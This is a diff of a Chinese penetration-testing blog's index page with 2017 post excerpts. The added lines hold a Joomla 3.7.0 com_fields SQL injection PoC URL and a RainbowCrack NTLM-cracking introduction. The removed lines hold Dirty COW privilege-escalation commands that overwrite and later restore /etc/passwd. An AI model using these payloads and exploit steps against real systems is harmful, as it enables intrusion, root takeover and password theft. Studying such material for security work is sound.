@@ -139,6 +139,71 @@
 
     <div class="post-header index">
         <h1 class="title">
+            <a href="/2017/05/18/joomla-3-70-exp-getshell/">
+                Joomla 3.70 com_fields组件sql注入及joomla3.x拿shell
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2017-05-18</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/joomla-exp/">joomla exp</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>大致 poc 如下:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.23/</span>Joomla_3.<span class="number">7.0</span>-Stable-Full_Package/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=extractvalue(rand(),concat(<span class="number">0x3a</span>,user()))</div></pre></td></tr></table></figure></p>
+<p><img src="/img/joomla 370 poc.png" alt=""><br><br>
+        </div>
+        <a href="/2017/05/18/joomla-3-70-exp-getshell/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2017/05/15/RainbowCrack/">
+                使用 rainbowcrack 快速破解 ntlm
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2017-05-15</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/rainbowcrack/">rainbowcrack</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>0x01 RainbowCrack简介<br>&nbsp;&nbsp;&nbsp;&nbsp;今天就来介绍另一款相对比较实用的NTLM hash破解工具,其本质是基于事先生成好的对应各种散列类型的彩虹表,支持GPU[amd/英伟达]加速,通常,就我个人来讲,主要都是用它来跑NTLM的,想比之下,要比之前所介绍的两款hash破解工具弱很多,虽然没那么智能,但它使用非简单,极易上手,平台支持也相对比较好,此次暂以win平台为例进行简单演示<br><br><br>0x02 关于 RainbowCrack 套件的基本使用流程,如下<br><figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">创建彩虹表[<span class="function"><span class="title">rtgen</span>] -&gt;</span> 对彩虹表进行排序[<span class="function"><span class="title">rtsort</span>] -&gt;</span> 开始真正的hash破解过程[rcrack]</div></pre></td></tr></table></figure></p>
+<p><br></p>
+<p>0x03 开始创建彩虹表<br>&nbsp;&nbsp;&nbsp;&nbsp;简单来说,彩虹表内部其实就是由所有可能组合的明文和其所对应的hash组成,类似nosql中的键值对形式[难道是因为这样效率就会很高吗,其实具体的数据结构自己也并不是非常清楚,还是那句话,实际渗透中能上就好],其实说白点还是基于字典,只不过这个字典是经过优化的,rtgen具体参数作用如下:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> rtgen.exe hash_algorithm charset plaintext_len_min plaintext_len_max table_index chain_len chain_num part_index</span></div></pre></td></tr></table></figure></p>
+        </div>
+        <a href="/2017/05/15/RainbowCrack/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
             <a href="/2017/05/15/PS1/">
                 烦躁的不行……,调了个好看的 PS1
             </a>
@@ -322,70 +387,6 @@
             <p><br><br>0x01 环境简介<br>&nbsp;&nbsp;&nbsp;&nbsp;关于 SquirrelMail 就不用多说了吧[一套开源php 邮件程序][说实话,用这套程序的目标还是蛮多的,尼玛,不说了,都是泪……],在重现漏洞利用之前,我们需要先把邮件服务器简单搭起来,这里以centos 6.8 x86 为例 [为了避免安装过程出问题,iptables和selinux已事先全部关闭],大致的配置过程如下,下面是具体测试环境:<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">kali</span> 2017: 执行<span class="selector-tag">SquirrelMail_RCE_exploit</span><span class="selector-class">.sh</span>  利用脚本</div><div class="line"><span class="selector-tag">centos</span> 6<span class="selector-class">.8</span> <span class="selector-tag">x86</span>:  完全模拟真实的生产环境,<span class="selector-tag">lamp</span>全程源码包编译配置<span class="selector-attr">[后期会把各种配置细节更新上来]</span></div><div class="line"><span class="selector-tag">SquirrelMail</span>版本 1<span class="selector-class">.4</span><span class="selector-class">.20</span></div></pre></td></tr></table></figure></p>
         </div>
         <a href="/2017/04/24/SquirrelMail-RCE/" class="read-more">Read More</a>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2017/04/24/kali-config/">
-                kali 安装后的简要配置指南
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2017-04-24</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/kali-config/">kali config</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p><br><br>1,最近刚好看到kali有更新,想想自己用的系统似乎也很久没更新过了,这里就顺手记录了下关于部署渗透系统的一些心得,留给有需要的朋友做些简单参考,首先,到kali的官网去下载最新版的kali镜像或者镜像虚拟机,这里我就直接用它已经配好的虚拟机来做演示说明<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">https:</span>/<span class="regexp">/images.offensive-security.com/virtual</span>-images/Kali-Linux-<span class="number">2017.1</span>-vm-amd64.<span class="number">7</span>z</div><div class="line"><span class="symbol">https:</span>/<span class="regexp">/images.offensive-security.com/virtual</span>-images/Kali-Linux-<span class="number">2017.1</span>-vm-i686.<span class="number">7</span>z</div></pre></td></tr></table></figure></p>
-<p>2,镜像下载好以后,解压镜像文件,然后到VMware中选择并打开该虚拟机,进入系统,编辑source.list文件,修改为官方的apt源,强烈建议这里用官网的源,尽量不要用任何第三方源,务必谨记<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># vi /etc/apt/sources.list</span></div></pre></td></tr></table></figure></p>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">deb <span class="symbol">http:</span>/<span class="regexp">/http.kali.org/kali</span> kali-rolling main non-free contrib</div></pre></td></tr></table></figure>
-        </div>
-        <a href="/2017/04/24/kali-config/" class="read-more">Read More</a>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2017/04/22/dirty/">
-                linux 溢出提权小记
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2017-04-22</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/exp/">exp</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p><br><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="string">'脏牛'</span>[Dirty copy-on-write] 提权小记:</div><div class="line">实际渗透中,提的成功率相对来讲还是蛮高的,屡试不爽,废话不多说,祝大家好运吧,至于漏洞细节,请自行参考公告,影响内核版本  Dirty COW.c  <span class="number">2.6</span>.<span class="number">22</span> &lt; <span class="number">3.9</span> </div><div class="line"></div><div class="line">$ gcc -pthread dirty.c -o dirty -lcrypt</div><div class="line">$ ./dirty admin</div><div class="line">$ su firefart</div><div class="line"><span class="comment"># mv /tmp/passwd.bak /etc/passwd	干完活,一定要记得把东西还原回来,exp已经有相应的msf模块可用,大家请自行尝试</span></div><div class="line"><span class="comment"># exit</span></div></pre></td></tr></table></figure></p>
-        </div>
-        <a href="/2017/04/22/dirty/" class="read-more">Read More</a>
     
 
 </div>
